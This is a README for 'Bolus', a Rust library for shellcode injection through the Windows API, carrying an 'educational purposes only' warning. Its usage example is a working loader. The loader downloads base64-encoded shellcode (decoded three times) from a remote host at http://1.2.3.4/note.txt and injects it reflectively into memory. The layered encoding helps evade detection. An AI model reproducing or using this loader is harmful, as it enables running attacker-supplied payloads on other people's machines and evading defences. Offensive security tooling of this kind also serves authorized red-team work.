# Bolus

Library for shellcode injection using the Windows API.

**WARNING: This code is for educational purposes only. The creator strongly urges you to only use this code in authorized contexts. Don't do crimes.**

## Usage


The following is an example implementation, which can be observed in [RustyNeedle](https://github.com/mttaggart/RustyNeedle):

```rust
use bolus::{
    inject,
    load,
    injectors::{
        InjectionType,
        InjectorType
    }
};

/// The URL where shellcode will be downloaded from
const URL: &str = "http://1.2.3.4/note.txt";
/// The # of base64 iterations to decode
const B64_ITERATIONS: usize = 3;
/// `IgnoreSSL` switch. You know what this does.
const IGNORE_SSL: bool = false;

fn main() -> Result<(), String> {
    let injector = load(
        InjectorType::Base64Url((
            URL.to_string(),
            IGNORE_SSL,
            B64_ITERATIONS
        ))
    )?;
    inject(
        injector,
        InjectionType::Reflect,
        true
    )
}
```

## Documentation

Full docs at [docs.rs](https://docs.rs/bolus/latest/bolus/)
